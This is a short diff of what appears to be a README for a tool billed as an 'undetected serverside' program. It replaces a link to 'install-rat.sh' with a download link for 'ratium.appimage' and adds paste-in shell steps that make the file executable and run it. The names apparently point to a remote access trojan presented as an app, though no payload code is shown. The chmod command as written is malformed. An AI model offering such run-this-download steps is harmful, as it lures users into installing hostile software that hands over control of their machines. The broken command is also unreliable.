@@ -1,7 +1,12 @@
 HOW TO DOWNLOAD SUPER UNDETECTED SERVERSIDE ULTRA SIGMA!!!!1!!
- RUN [THE INSTALLER](/install-rat.sh)
-
-
+ DOWNLOAD [THE APP](/ratium.appimage) AND
+ RUN 
+ 
+ ```sh
+ cd ~/Downloads
+ chmod +x = ratium.appimage
+ ./ratium.appimage
+ ```
 
 
 
